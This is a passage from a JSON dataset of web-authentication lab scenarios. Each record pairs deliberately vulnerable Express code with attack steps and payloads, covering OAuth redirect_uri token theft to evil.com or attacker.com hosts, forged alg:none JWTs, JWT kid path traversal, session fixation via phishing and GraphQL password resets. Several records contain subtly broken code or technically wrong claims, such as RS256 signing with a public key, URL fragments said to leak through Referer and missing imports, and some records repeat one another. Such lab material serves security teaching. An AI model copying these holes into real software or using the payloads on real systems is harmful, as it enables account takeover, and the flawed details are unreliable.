          "Send this crafted URL to Carlos via phishing or simulate the redirect.",
          "Capture the access token in your server and replay it against /account API."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token-for-carlos'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer token-for-carlos') res.send('Carlos account info'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
        "payloads": [
          "https://vulnerable-app.com/auth?redirect_uri=https://evil.com/capture",
          "Authorization: Bearer token-for-carlos"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token verification endpoint",
        "Lab Description": "This lab implements a stateless authentication mechanism using JSON Web Tokens (JWTs). However, the server is vulnerable to an algorithm confusion flaw due to improper handling of the JWT 'alg' field. The application accepts tokens signed using both 'HS256' and 'RS256', using a single public key to verify all incoming tokens. To solve the lab, forge a valid admin token and access the administrative panel.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to capture a valid JWT after logging in as a regular user.",
          "2. Use jwt.io or a script to decode the token and analyze the payload and header.",
          "3. Modify the 'alg' field in the JWT header to 'HS256' and replace the 'sub' claim with 'admin'.",
          "4. Use the server’s public key (obtained from /public.pem) as the HMAC secret to sign the modified JWT using HS256.",
          "5. Submit the forged JWT as a cookie and access /admin to verify successful privilege escalation."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const pubKey = fs.readFileSync('./public.pem'); app.get('/login', (req, res) => { const user = req.query.user || 'guest'; const token = jwt.sign({ sub: user, role: 'user' }, pubKey, { algorithm: 'RS256' }); res.cookie('auth', token); res.send(`Token issued for ${user}`); }); app.get('/admin', (req, res) => { try { const token = req.cookies.auth; const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'admin') { res.send('Welcome to the admin panel'); } else { res.status(403).send('Access denied'); } } catch (err) { res.status(401).send('Invalid token'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Header: {\"alg\":\"HS256\"}, Payload: {\"sub\":\"admin\"}, Signed with public.pem as secret",
          "jwt.sign({sub:'admin'}, pubKey, {algorithm: 'HS256'})"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure cookie reassignment",
        "Lab Description": "This lab's session management is flawed. The application does not regenerate the session ID upon successful login, allowing an attacker to fix the victim's session ID prior to authentication. The application accepts a session ID as a query parameter and reflects it into a cookie. To solve the lab, fix a session ID for Carlos and trick him into logging in, then use the same session ID to access his account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to craft a GET request to /set-session?sid=attacker123 and observe that the Set-Cookie header reflects the session ID.",
          "2. Share a crafted link like /login?sid=attacker123 with Carlos via the simulated email client.",
          "3. Wait for Carlos to log in using the attacker-controlled session ID.",
          "4. Use the same session ID cookie 'sid=attacker123' in a request to /my-account.",
          "5. Confirm you are logged in as Carlos and view his account details."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/set-session', (req, res) => { const { sid } = req.query; res.cookie('sid', sid); res.send('Session set'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid credentials'); const sid = req.cookies.sid || `sess_${Math.random().toString(36).substring(2)}`; sessions[sid] = username; res.cookie('sid', sid); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username) res.send(`Welcome ${username}`); else res.status(403).send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "/set-session?sid=attacker123",
          "/login?sid=attacker123",
          "Cookie: sid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token leakage via referrer header",
        "Lab Description": "This lab demonstrates how improper use of the OAuth 2.0 implicit flow results in access token leakage via the HTTP Referer header. The vulnerable application redirects users with an access token in the URL fragment. An attacker-controlled site can trick authenticated users into visiting a resource which leaks the token in the Referer header. To solve the lab, steal Carlos's access token and access the /private-data endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Set up a listener (e.g., https://attacker.com/log) and host a malicious page that loads an image from /profile#access_token=XYZ.",
          "2. Send Carlos a crafted link to https://attacker.com?redirect=https://vulnerable.com/profile#access_token=XYZ.",
          "3. Carlos's browser loads the image from the vulnerable app with the token in the fragment.",
          "4. The fragment is not sent to the server, but if redirected to another page with the token appended to the query string, it leaks via the Referer header.",
          "5. Capture the access token in your server logs and reuse it by sending a request with Authorization: Bearer <token> to /private-data.",
          "6. Confirm access to private data and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/authorize', (req, res) => { const redirect = req.query.redirect_uri; const token = 'carlos-token'; res.redirect(`${redirect}#access_token=${token}`); }); app.get('/private-data', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const user = tokens[token]; if (!user) return res.status(403).send('Invalid token'); res.send(`Private data of ${user}`); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Token Leakage Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://vulnerable.com/profile#access_token=carlos-token",
          "Authorization: Bearer carlos-token"
        ]
      },
      {
        "Lab scenario": "JWT none algorithm bypass in REST API login flow",
        "Lab Description": "The application uses JSON Web Tokens (JWTs) to manage sessions and validate authenticated users via a RESTful login API. However, it incorrectly accepts the 'none' algorithm in JWTs, allowing token forgery. The application trusts the JWT payload without signature verification when 'alg' is set to 'none'. To solve: Forge a JWT for the user carlos and access their account page using the tampered token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Postman to send valid credentials to the /api/login endpoint and retrieve a signed JWT.",
          "2. Decode the JWT using jwt.io or a JWT decoder in Burp Suite to inspect the header and payload structure.",
          "3. Modify the JWT header by changing the 'alg' field to 'none', and alter the payload to set 'username' to 'carlos'.",
          "4. Remove the signature portion entirely and send the tampered token in the Authorization header: 'Bearer <token>'.",
          "5. Verify access to /api/account and check that the response contains Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/api/account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Sensitive account data for carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
          "JWT crafted with alg: none, no signature, username: carlos"
        ]
      },
      {
        "Lab scenario": "OAuth redirect URI manipulation",
        "Lab Description": "This application uses OAuth2 for third-party login, but fails to properly validate redirect URIs. It accepts user-controlled input in the redirect_uri parameter during the authorization flow. To solve: Trick the OAuth provider to send an access token to your controlled domain, then use the token to gain access to Carlos’s account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to intercept the OAuth authorization flow during login with Google.",
          "2. Modify the redirect_uri parameter in the authorization request to a domain you control (e.g., https://evil.com/callback).",
          "3. Simulate the OAuth flow and capture the token returned to your malicious redirect URI.",
          "4. Replay the login request with the captured token, modifying the Authorization header to include: Bearer <token>.",
          "5. Use the token to access /my-account endpoint as carlos and verify lab completion."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const url = `https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=${redirect_uri}&response_type=token`; res.redirect(url); }); app.get('/oauth-callback', (req, res) => { const token = req.query.access_token; request.get({ url: 'https://oauth.fake-provider.com/userinfo', headers: { Authorization: `Bearer ${token}` } }, (err, resp, body) => { const userInfo = JSON.parse(body); if (userInfo.email === 'carlos@example.com') { res.send('Account page for carlos'); } else { res.send('Unauthorized'); } }); }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Redirect URI Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://oauth.fake-provider.com/auth?client_id=app123&redirect_uri=https://evil.com/callback",
          "Manipulated redirect_uri=https://evil.com/callback",
          "Stolen token from OAuth callback"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "The application assigns session IDs before login and fails to regenerate them upon successful authentication. An attacker can predetermine a session and then trick a user into authenticating with it. To solve: Set a fixed session ID for Carlos before he logs in, then hijack the session to access his account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to capture a login request and observe that the session cookie is issued before login.",
          "2. Generate a fixed session ID and set it using document.cookie via XSS or social engineering in the victim’s browser.",
          "3. Wait for the victim (Carlos) to log in with the fixed session.",
          "4. Reuse the known session ID in your own browser via the Cookie header.",
          "5. Access the /account endpoint to retrieve Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: '123456' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Account data for carlos'); else res.send('Access denied'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Cookie: sid=abc123 (set in victim's browser)",
          "Session hijack via fixed sid=abc123",
          "Use of known SID to access /account as carlos"
        ]
      },
      {
        "Lab scenario": "JWT Secret Key Brute-Force in Authorization Header",
        "Lab Description": "This lab uses JWT tokens for stateless authentication but fails to use a secure secret key. The token is signed with a guessable value, making it vulnerable to brute-force attacks. The application verifies the signature using a hardcoded secret and grants access based on the 'admin' claim. To solve: Forge a valid JWT token with 'admin':true and access the /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept the JWT token from the Authorization header after logging in as a regular user.",
          "Use jwt.io or jwt_tool to decode the token and analyze the header and payload.",
          "Brute-force the JWT secret using a common wordlist with jwt-cracker or hashcat (mode 16500).",
          "Once the correct secret is found, modify the payload to include 'admin':true and re-sign the token.",
          "Replace the original Authorization header with the forged token and send a GET request to /admin to verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'letmein'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.admin) return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
        "payloads": [
          "jwt_tool original_token -C -p '{\"admin\":true}' -s letmein",
          "jwt.io using header/payload re-sign with secret 'letmein'",
          "Authorization: Bearer <new_token_with_admin_true>"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Weak Token Binding",
        "Lab Description": "The application assigns a session cookie before login and fails to regenerate it after authentication. Attackers can set a known session ID and trick the victim into logging in with it. To solve: Fix a session ID, trick the victim to log in, then reuse the session ID to access /my-account as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to observe that the session cookie is issued pre-authentication and not updated post-login.",
          "Set a fixed session ID using Burp's cookie editor and open the login page with this cookie.",
          "Host a malicious page that opens the login URL with the attacker's fixed session cookie (social engineering).",
          "After the victim logs in, reuse the same session ID in a new request to access the /my-account endpoint.",
          "Confirm access to victim's account without knowing their credentials."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'alice': { password: '12345' } }; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sid) { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const sid = req.cookies.sid; sessions[sid].user = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]?.user; if (user) res.send(`Welcome back, ${user}`); else res.status(401).send('Please log in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
        "payloads": [
          "Set-Cookie: sid=attacker123;",
          "GET /login (with sid=attacker123)",
          "Reuse sid=attacker123 after victim login"
        ]
      },
      {
        "Lab scenario": "OAuth Implicit Flow Token Theft via Referer Leak",
        "Lab Description": "This lab uses OAuth 2.0 implicit flow to obtain access tokens via redirects. The redirection target page leaks the access token in the Referer header. To solve: Intercept the redirect and steal the token using a malicious third-party page, then access /oauth/user-info as the victim.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Analyze the OAuth login flow with Burp Suite and confirm that the access token is returned in the URL fragment (#access_token=...).",
          "Observe that the final redirect goes to a page that loads external content, such as an image or script.",
          "Host a malicious image on your server and inject it into the redirect target page to capture Referer headers.",
          "Trigger the OAuth login and have the redirect go through your image endpoint, capturing the access token in the Referer.",
          "Use the stolen token in a Bearer Authorization header to access /oauth/user-info."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/redirect', (req, res) => { res.send('<html><body><img src=\"http://attacker.com/log?ref='+req.headers.referer+'\" /></body></html>'); }); app.get('/oauth/user-info', (req, res) => { const auth = req.headers['authorization']; if (!auth || !auth.startsWith('Bearer ')) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === 'valid-oauth-token') res.send('User info: carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on port 4000'));",
        "payloads": [
          "OAuth login flow ending at /oauth/redirect",
          "Malicious image hosted at http://attacker.com/log",
          "GET /oauth/user-info with Authorization: Bearer valid-oauth-token"
        ]
      },
      {
        "Lab scenario": "JWT signature 'none' bypass in Authorization header",
        "Lab Description": "The application uses JWT tokens for authentication but does not validate the token's signature algorithm properly. It allows an attacker to manipulate the JWT by setting the `alg` header to 'none'. The application accepts unsigned tokens. To solve: forge a JWT with `alg: none` to access Carlos's account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Intercept a valid login request using Burp Suite and observe the JWT in the Authorization header after successful login.",
          "2. Decode the JWT using jwt.io or Postman to examine the header, payload, and signature.",
          "3. Craft a new JWT with `alg: none`, set `sub: carlos`, and remove the signature.",
          "4. Replace the original JWT in the Authorization header with your forged token using Burp Repeater.",
          "5. Send a GET request to /my-account using the forged token and verify access to Carlos’s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.sub) { res.send(`Account details for ${payload.payload.sub}`); } else { res.status(401).send('Unauthorized'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
          "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
          "Authorization: Bearer <forged-token>"
        ]
      },
      {
        "Lab scenario": "Session fixation in pre-login cookie assignment",
        "Lab Description": "This application sets a session ID cookie before authentication. Upon login, it reuses the existing session instead of regenerating it, allowing session fixation attacks. To solve: fix a session, get Carlos to log in using it, then hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP or Burp Suite to access the login page and capture the `sessionId` cookie issued pre-login.",
          "2. Send Carlos a phishing email with a crafted link to the login page that forces use of the session ID you control.",
          "3. Once Carlos logs in, use the fixed session ID cookie to access /my-account as Carlos.",
          "4. Send the session cookie with a GET request to /my-account using Burp Repeater.",
          "5. Confirm unauthorized access to Carlos's account using the fixed session."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionId) { res.cookie('sessionId', Math.random().toString(36).substring(2)); } res.send('Login Page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back, ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "Cookie: sessionId=fixed123",
          "http://target-app.com/login?sessionId=fixed123",
          "Set-Cookie: sessionId=fixed123"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via redirect URI manipulation",
        "Lab Description": "The app implements OAuth login but does not properly validate redirect URIs during token exchange. An attacker can manipulate the redirect_uri parameter to capture tokens. To solve: leak Carlos’s token using a crafted malicious redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Burp Suite to initiate the OAuth flow and identify the request containing the `redirect_uri` parameter.",
          "2. Modify the `redirect_uri` to a domain you control (e.g., https://evil.com/callback) using Burp Repeater.",
          "3. Send the modified authorization request to the victim (Carlos) to trick them into authenticating.",
          "4. Capture the access_token from your controlled redirect endpoint.",
          "5. Use Postman to send a request with the captured token to /my-account and access Carlos’s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'carlos-token-xyz' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state, user } = req.query; if (tokens[user]) { const uri = `${redirect_uri}?access_token=${tokens[user]}&state=${state}`; res.redirect(uri); } else { res.status(400).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) res.send(`Hello ${user}, this is your account.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running on http://localhost:4000'));",
        "payloads": [
          "https://attacker.com/callback?access_token=carlos-token-xyz",
          "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&user=carlos&state=123",
          "GET /my-account?access_token=carlos-token-xyz"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg field is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Intercept a valid JWT token using Burp Suite while logging in as a normal user",
            "Decode the token using jwt.io to analyze its structure",
            "Modify the algorithm to 'none' and change the role to 'admin'",
            "Remove the signature portion of the JWT (after the last dot)",
            "Send the modified token in the Authorization header to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.alg === 'none') {\n    if (decoded.payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  } else {\n    try {\n      jwt.verify(token, 'secretkey');\n      if (decoded.payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    } catch (e) {\n      return res.status(403).send('Invalid token');\n    }\n  }\n  \n  res.status(403).send('Access denied');\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
        ]
    },
    {
        "Lab scenario": "GraphQL introspection query exposing authentication fields",
        "Lab Description": "The GraphQL endpoint has introspection enabled, revealing sensitive authentication fields and mutations. The application exposes password reset functionality through undocumented GraphQL mutations. To solve: exploit the exposed mutation to reset the admin password.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use Postman to send introspection queries to the GraphQL endpoint",
            "Analyze the schema to discover hidden mutations using GraphQL Voyager",
            "Identify the passwordReset mutation and its required parameters",
            "Craft a mutation request with the admin email and new password",
            "Verify success by logging in with the new credentials"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\n\nconst typeDefs = gql`\n  type Mutation {\n    passwordReset(email: String!, newPassword: String!): Boolean\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    passwordReset: (_, { email, newPassword }) => {\n      const user = users.find(u => u.email === email);\n      if (user) {\n        user.password = newPassword;\n        return true;\n      }\n      return false;\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers, introspection: true });\nconst app = express();\nserver.applyMiddleware({ app });\n\napp.listen({ port: 4000 }, () =>\n  console.log(`GraphQL lab running at http://localhost:4000${server.graphqlPath}`)\n);",
        "payloads": [
            "{\"query\":\"mutation { passwordReset(email: \\\"admin@lab.com\\\", newPassword: \\\"hacked123\\\") }\"}",
            "{\"query\":\"mutation {\\n  __schema {\\n    mutationType {\\n      fields {\\n        name\\n        description\\n      }\\n    }\\n  }\\n}\"}",
            "{\"query\":\"mutation($email: String!, $newPass: String!) { passwordReset(email: $email, newPassword: $newPass) }\",\"variables\":{\"email\":\"admin@lab.com\",\"newPass\":\"pwned!\"}}"
        ]
    },
    {
        "Lab scenario": "OAuth token hijacking through open redirect",
        "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URLs during OAuth token exchange. To solve: steal an OAuth token by tricking a user into authenticating through your malicious redirect.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Identify the OAuth callback endpoint using OWASP ZAP",
            "Craft a malicious URL with a controlled redirect parameter",
            "Set up a netcat listener to capture incoming tokens",
            "Social engineer a victim to click the crafted URL",
            "Intercept the token and use it to authenticate as the victim"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://legit-client.com/callback']\n  }\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state, redirect_uri } = req.query;\n  const clientId = req.query.client_id;\n  \n  if (!clients[clientId]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  if (code && redirect_uri) {\n    return res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n  }\n  \n  res.status(400).send('Invalid request');\n});\n\napp.listen(3000);",
        "payloads": [
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=123",
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=http://localhost:9000&response_type=token",
            "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=data:text/html,<script>alert(document.cookie)</script>&response_type=code"
        ]
    },
    {
        "Lab scenario": "Session fixation in SOAP API authentication",
        "Lab Description": "The lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application accepts pre-defined session IDs during login without proper validation. To solve: fixate a session ID and trick an admin into authenticating with it to gain privileged access.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
            "Use OWASP ZAP to intercept a login request to /soap-auth endpoint",
            "Add a custom SessionID header with a predictable value (e.g., 'fixed123')",
            "Note the Set-Cookie response confirming session acceptance",
            "Craft a phishing link containing the fixed session ID",
            "Verify admin access by reusing the session ID after victim login"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nconst sessions = {};\n\napp.post('/soap-auth', (req, res) => {\n  const xml = req.rawBody;\n  const parser = new xml2js.Parser();\n  parser.parseString(xml, (err, result) => {\n    const sessionId = req.headers['sessionid'] || uuidv4();\n    sessions[sessionId] = {\n      user: result['soap:Envelope']['soap:Body'][0].Login[0].Username[0],\n      role: 'user'\n    };\n    res.set('Set-Cookie', `SESSION=${sessionId}; HttpOnly`);\n    res.send('<soap:Success/>');\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "<soap:Envelope><soap:Body><Login><Username>admin</Username><Password>any</Password></Login></soap:Body></soap:Envelope>",
            "POST /soap-auth HTTP/1.1\nHost: vulnerable.com\nSessionID: fixed123\nContent-Type: text/xml\n\n<soap:Envelope><soap:Body><Login><Username>victim</Username><Password>p@ssw0rd</Password></Login></soap:Body></soap:Envelope>",
            "GET /admin-panel HTTP/1.1\nHost: vulnerable.com\nCookie: SESSION=fixed123"
        ]
    },
    {
        "Lab scenario": "JWT kid header path traversal in REST microservice",
        "Lab Description": "The JWT validation service is vulnerable to key path traversal via the kid header parameter. The application uses the kid value to load verification keys without sanitization. To solve: craft a JWT that forces the server to use a predictable public key for verification.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Capture a valid JWT using Burp Suite and decode its structure",
            "Modify the kid header to point to /dev/null or /proc/self/fd/0",
            "Sign the token with an empty key using jwt_tool",
            "Brute-force the admin endpoint with the crafted token",
            "Verify access to privileged endpoints with the valid token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const keyPath = `/keys/${decoded.header.kid}`;\n  const pubKey = fs.readFileSync(keyPath);\n  \n  jwt.verify(token, pubKey, (err, payload) => {\n    if (err) return res.status(403).send('Invalid token');\n    res.json({access: payload.role === 'admin' ? 'granted' : 'denied'});\n  });\n});\n\napp.listen(3000);",
        "payloads": [
            "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.FakeSignature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZmQvMCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.FakeSig",
            "eyJraWQiOiIva2V5cy8uLi8uLi9ldGMvcGFzc3dkIiwidHlwIjoiSldUIiwiYWxnIjoiSFMyNTYifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSignature"
        ]
    },
    {
        "Lab scenario": "OAuth token leakage through verbose error messages",
        "Lab Description": "The OAuth token endpoint leaks sensitive information through detailed error responses. The application reveals valid tokens in error messages when malformed requests are sent. To solve: extract a valid OAuth token by analyzing error responses and use it to access protected resources.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Use Postman to send malformed token requests to /oauth/token",
            "Analyze error responses for leaked token fragments",
            "Reconstruct complete tokens from error message snippets",
            "Validate tokens by accessing /api/me endpoint",
            "Exfiltrate user data using the stolen token"
        ],
        "Vulnerability name": "Authentication",
